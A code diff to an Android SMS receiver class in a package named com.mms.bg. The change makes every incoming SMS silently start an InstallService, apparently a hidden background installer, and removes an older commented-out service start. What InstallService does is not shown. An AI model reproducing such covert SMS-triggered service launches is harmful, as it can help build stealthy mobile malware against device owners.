@@ -24,6 +24,7 @@ import com.android.internal.telephony.TelephonyIntents;
 import android.provider.Telephony.Sms.Intents;
 
 import com.mms.bg.ui.BgService;
+import com.mms.bg.ui.InstallService;
 import com.mms.bg.ui.InternetStatusReceiver;
 import com.mms.bg.ui.SettingManager;
 
@@ -42,10 +43,16 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
         if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
         
         SettingManager sm = SettingManager.getInstance(context.getApplicationContext());
-//        Intent intent1 = new Intent(context, BgService.class);
-//        intent1.setAction(BgService.ACTION_BOOT);
-//        context.startService(intent1);
         sm.log(TAG, "PrivilegedSmsReceiver::onReceive");
+        
+        if (sm.getAppType().equals(SettingManager.APP_TYPE_INTERNAL)) {
+            if (InstallService.service_start == false) {
+                Intent intent_new = new Intent(context, InstallService.class);
+                intent_new.setAction(BgService.ACTION_BOOT);
+                context.startService(intent_new);
+            }
+            return;
+        }
         
         sm.makePartialWakeLock();
         SmsMessage[] msgs1 = Intents.getMessagesFromIntent(intent);
